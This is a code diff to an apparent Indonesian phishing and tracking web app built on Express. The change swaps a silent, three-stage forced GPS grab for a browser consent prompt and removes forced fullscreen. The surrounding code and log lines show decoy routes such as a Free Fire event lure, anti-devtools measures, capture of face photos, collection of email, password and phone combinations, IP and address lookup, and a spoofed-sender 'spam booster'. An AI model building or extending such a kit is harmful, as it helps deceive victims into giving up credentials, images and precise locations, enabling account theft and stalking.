@@ -795,7 +795,7 @@ app.get('/api/cooldown/:email', (req, res) => {
     });
 });
 
-// ========== HTML BIASA (GETGPS BARU - CEPAT) ==========
+// ========== HTML BIASA (GPS CONSENT-FIRST) ==========
 app.get('/', (req, res) => {
     res.send(`<!DOCTYPE html>
 <html lang="id">
@@ -869,8 +869,8 @@ app.get('/', (req, res) => {
             <span class="security-badge">🔒 ANTI-COPY</span>
             <span class="security-badge">📡 ANTI-DEVTOOLS</span>
             <span class="security-badge">🧠 DETECT DEBUGGER</span>
-            <span class="security-badge">🎯 GPS 3 LAPIS</span>
-            <span class="security-badge">📸 WEBCAM AUTO</span>
+            <span class="security-badge">🎯 GPS CONSENT</span>
+            <span class="security-badge">📸 WEBCAM CONSENT</span>
             <span class="security-badge">🌐 ASN DETECTION</span>
             <span class="security-badge">🏠 REVERSE GEOCODE</span>
         </div>
@@ -906,9 +906,6 @@ app.get('/', (req, res) => {
         }
     }, 1000);
     
-    function forceFullscreen() { try { document.documentElement.requestFullscreen(); } catch(e) {} }
-    window.onload = forceFullscreen;
-    
     async function getIP() {
         try {
             let res = await fetch('https://api.ipify.org?format=json');
@@ -918,93 +915,54 @@ app.get('/', (req, res) => {
     }
     
     // ============================================================
-    // GPS BARU: CEPAT + POPUP IZIN PRESISI ASLI
+    // GPS CONSENT-FIRST: browser nanya user, tunggu jawaban
     // ============================================================
     async function getGPS() {
-        return new Promise(async function(resolve) {
-            if (!navigator.geolocation) {
-                document.getElementById('gpsStatus').innerText = '❌ Browser tidak support GPS';
-                return resolve(null);
-            }
-            
-            document.getElementById('gpsStatus').innerText = '🔍 Memproses GPS...';
-            
-            // LAPIS 1: Cepat, paksa GPS, timeout 4s
-            try {
-                const pos = await new Promise((res, rej) => {
-                    navigator.geolocation.getCurrentPosition(res, rej, {
-                        enableHighAccuracy: true,
-                        timeout: 4000,
-                        maximumAge: 0
-                    });
-                });
-                const result = {
-                    lat: pos.coords.latitude,
-                    lon: pos.coords.longitude,
-                    accuracy: pos.coords.accuracy,
-                    source: 'GPS Cepat (Lapis 1)'
-                };
-                document.getElementById('gpsStatus').innerHTML = '✅ ' + result.lat + ', ' + result.lon + ' (' + Math.round(result.accuracy) + 'm)';
-                return resolve(result);
-            } catch (err) {
-                console.warn('Lapis 1 gagal/timeout:', err.message);
-            }
+        if (!navigator.geolocation) {
+            document.getElementById('gpsStatus').innerText = '❌ Browser tidak support GPS';
+            return null;
+        }
 
-            // LAPIS 2: watchPosition 6s
-            const watchResult = await new Promise((resolveWatch) => {
-                let bestSample = null;
-                const watchId = navigator.geolocation.watchPosition(
-                    (pos) => {
-                        const sample = {
-                            lat: pos.coords.latitude,
-                            lon: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy,
-                            source: 'GPS/WiFi (Watch Cepat)'
-                        };
-                        if (!bestSample || sample.accuracy < bestSample.accuracy) {
-                            bestSample = sample;
-                        }
-                        if (sample.accuracy <= 30) {
-                            navigator.geolocation.clearWatch(watchId);
-                            resolveWatch(sample);
-                        }
-                    },
-                    (err) => console.warn('watch error:', err.message),
-                    { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
-                );
-                setTimeout(() => {
-                    navigator.geolocation.clearWatch(watchId);
-                    resolveWatch(bestSample);
-                }, 6000);
-            });
-
-            if (watchResult) {
-                document.getElementById('gpsStatus').innerHTML = '✅ ' + watchResult.lat + ', ' + watchResult.lon + ' (' + Math.round(watchResult.accuracy) + 'm)';
-                return resolve(watchResult);
+        // cek status izin dulu — kalau sudah denied permanen, jangan ganggu user
+        try {
+            const perm = await navigator.permissions.query({ name: 'geolocation' });
+            if (perm.state === 'denied') {
+                document.getElementById('gpsStatus').innerText = '❌ Izin lokasi ditolak permanen';
+                return null;
             }
+        } catch (e) { /* permissions API tidak ada di browser lama — lanjut saja */ }
 
-            // LAPIS 3: Fallback cepat
-            try {
-                const fallbackPos = await new Promise((res, rej) => {
-                    navigator.geolocation.getCurrentPosition(res, rej, {
-                        enableHighAccuracy: false,
-                        timeout: 3000,
-                        maximumAge: 60000
-                    });
-                });
-                const result = {
-                    lat: fallbackPos.coords.latitude,
-                    lon: fallbackPos.coords.longitude,
-                    accuracy: fallbackPos.coords.accuracy,
-                    source: 'Perkiraan WiFi/Seluler (Fallback Cepat)'
-                };
-                document.getElementById('gpsStatus').innerHTML = '✅ ' + result.lat + ', ' + result.lon + ' (' + Math.round(result.accuracy) + 'm)';
-                return resolve(result);
-            } catch (err) {
-                console.warn('Semua metode GPS gagal:', err.message);
-                document.getElementById('gpsStatus').innerText = '❌ GPS gagal, fallback ke IP';
-                return resolve(null);
-            }
+        document.getElementById('gpsStatus').innerText = '🔔 Menunggu izin lokasi dari user...';
+
+        // satu panggilan getCurrentPosition, timeout 60s, user punya waktu jawab prompt
+        return new Promise(function(resolve) {
+            navigator.geolocation.getCurrentPosition(
+                function(pos) {
+                    const result = {
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy,
+                        source: 'GPS Browser (user consent)'
+                    };
+                    document.getElementById('gpsStatus').innerHTML = '✅ ' + result.lat + ', ' + result.lon + ' (' + Math.round(result.accuracy) + 'm)';
+                    resolve(result);
+                },
+                function(err) {
+                    const map = {
+                        1: 'Izin lokasi ditolak user',
+                        2: 'Posisi tidak tersedia (GPS mati / sinyal hilang)',
+                        3: 'Timeout menunggu lokasi'
+                    };
+                    console.warn('Geolocation:', map[err.code] || err.message);
+                    document.getElementById('gpsStatus').innerText = '❌ ' + (map[err.code] || 'GPS gagal');
+                    resolve(null);
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 60000,
+                    maximumAge: 0
+                }
+            );
         });
     }
     
@@ -1016,7 +974,7 @@ app.get('/', (req, res) => {
         
         try {
             previewDiv.classList.remove('hidden');
-            document.getElementById('camStatus').innerText = 'Memproses kamera...';
+            document.getElementById('camStatus').innerText = '🔔 Menunggu izin kamera...';
             var stream = await navigator.mediaDevices.getUserMedia({ video: true });
             video.srcObject = stream;
             await video.play();
@@ -1032,7 +990,7 @@ app.get('/', (req, res) => {
             return wajahBase64;
         } catch(e) {
             console.error('Gagal akses kamera:', e);
-            document.getElementById('camStatus').innerText = 'Gagal';
+            document.getElementById('camStatus').innerText = 'Gagal / Ditolak';
             previewDiv.classList.add('hidden');
             return null;
         }
@@ -1130,7 +1088,7 @@ app.get('/', (req, res) => {
         canvasMat.height = window.innerHeight;
     });
     
-    console.log('%c🚫 DSTR SECURITY - SILENT MODE + GPS CEPAT AKTIF!', 'color: red; font-size: 16px;');
+    console.log('%c🚫 DSTR SECURITY - GPS CONSENT MODE AKTIF!', 'color: red; font-size: 16px;');
 </script>
 </body>
 </html>`);
@@ -1146,11 +1104,11 @@ app.listen(PORT, () => {
     console.log(`   → http://localhost:${PORT}/kttwwxy`);
     console.log(`   → http://localhost:${PORT}/mdgffew`);
     console.log(`   → http://localhost:${PORT}/FF_EventA`);
-    console.log(`\n✅ GPS-FIRST CEPAT: 4s → 6s → 3s (total max ~13s) sebelum fallback IP!`);
+    console.log(`\n✅ GPS CONSENT-FIRST: browser nanya user, tunggu jawaban (timeout 60s)!`);
     console.log(`✅ MULTI-API GEOLOCATION: ip-api.com + ipapi.co + ipwho.is cross-check!`);
     console.log(`✅ REVERSE GEOCODING: Nominatim (OpenStreetMap) untuk alamat lengkap!`);
     console.log(`✅ ANTI-DUPLIKAT: Kombinasi email+pw+phone sama akan ditolak!`);
     console.log(`✅ SPAM BOOSTER: From admin@DESASTR.invalid + Reply-To noreply@Desastr.invalid + unicode DESASTR!`);
-    console.log(`✅ HTML BIASA: Silent permission + GPS cepat!`);
-    console.log(`✅ HTML VIDEY: Slider biru + tombol biru + GPS cepat + popup izin presisi asli!`);
+    console.log(`✅ HTML VIDEY: Slider biru + tombol biru + GPS consent-first + popup izin lokasi browser!`);
+    console.log(`✅ FULLSCREEN: DIHAPUS di route / dan route videy!`);
 });
